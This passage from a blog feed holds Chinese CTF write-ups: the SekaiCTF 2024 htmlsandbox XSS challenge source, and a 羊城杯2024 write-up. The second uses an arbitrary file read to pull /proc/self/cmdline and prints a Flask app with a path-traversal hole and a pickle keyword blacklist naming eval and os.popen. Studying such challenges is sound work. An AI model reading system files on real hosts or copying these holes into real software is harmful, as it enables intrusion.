function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page<span class="token punctuation">.</span><span class="token function">setDefaultTimeout</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// no shenanigans!</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// disallow making any requests</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setRequestInterception</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> reqCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        page<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token parameter">interceptedRequest</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            reqCount<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>interceptedRequest<span class="token punctuation">.</span><span class="token function">isInterceptResolutionHandled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>reqCount <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                interceptedRequest<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                interceptedRequest<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">visiting </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valid <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// check CSP tag is at the start</span>            <span class="token comment">// check no script tags or frames</span>            <span class="token comment">// check no event handlers</span>            <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>firstElementChild<span class="token punctuation">.</span>outerHTML <span class="token operator">===</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'"></span><span class="token template-punctuation string">`</span></span>                <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'script, noscript, frame, iframe, object, embed'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">null</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">EVENT_SELECTOR</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> reqCount <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> valid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Setup Express</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> html <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No html.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    html <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'&lt;html>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid html.'</span><span class="token punctuation">)</span>    <span class="token comment">// fast sanity check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;meta http-equiv="Content-Security-Policy" content="default-src \'none\'">'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No CSP.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    html <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// check again, more strictly...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">await</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token string">'data:text/html;base64,'</span> <span class="token operator">+</span> html<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Failed validation.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> html<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">EX</span><span class="token operator">:</span> <span class="token number">300</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="/upload/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">File uploaded!&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload/:id'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">;</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File not found.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>adminbot_test.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// npm i puppeteer</span><span class="token comment">// script to emulate admin bot</span><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> <span class="token string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">SITE</span> <span class="token operator">=</span> <span class="token string">"https://htmlsandbox.chals.sekai.team"</span><span class="token punctuation">;</span><span class="token keyword">const</span> target <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token literal-property property">dumpio</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token constant">SITE</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">||</span> target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤有点爆炸了，歇一会再看（</p><p>貌似是字符集绕过</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;xss领域大神啊&lt;/p&gt;
&lt;p&gt;你说得对，但今天是哈茨涅米库女士的生日，转发这条消息到五个群，中间忘了，反正会被骂一顿，但今天真的是哈茨涅米库女士的生日&lt;/p&gt;
&lt;p&gt;事已至此，先打会pjsk吧（&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831223757429.png&quot; alt=&quot;image-20240831223757429&quot;&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;utm_medium=rec#WEB&quot;&gt;https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;amp;utm_medium=rec#WEB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/&quot;&gt;https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.ankursundara.com/htmlsandbox-writeup/amp/&quot;&gt;https://blog.ankursundara.com/htmlsandbox-writeup/amp/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/</id>
    <published>2024-08-27T00:50:26.000Z</published>
    <updated>2024-08-31T05:50:03.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g">https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g</a></p><span id="more"></span><hr><h1 id="I-have-wrote-some-lyrics-for-you……"><a href="#I-have-wrote-some-lyrics-for-you……" class="headerlink" title="I have wrote some lyrics for you……"></a>I have wrote some lyrics for you……</h1><p>进去是一个任意文件读取：<code>/lyrics?lyrics=</code></p><p>先读 &#x2F;proc&#x2F;self&#x2F;cmdline ：得到运行路径<code>python3 -u /usr/etc/app/app.py</code></p><p>读下来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">from</span> config<span class="token punctuation">.</span>secret_key <span class="token keyword">import</span> secret_code<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> cookie <span class="token keyword">import</span> set_cookie<span class="token punctuation">,</span> cookie_check<span class="token punctuation">,</span> get_cookie<span class="token keyword">import</span> pickleapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>randbytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UserData</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token keyword">def</span> <span class="token function">Waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/lyrics"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=UTF-8'</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"lyrics"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/lyrics"</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            res <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No lyrics found"</span>    <span class="token keyword">return</span> res<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> UserData<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/board"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> invalid<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get 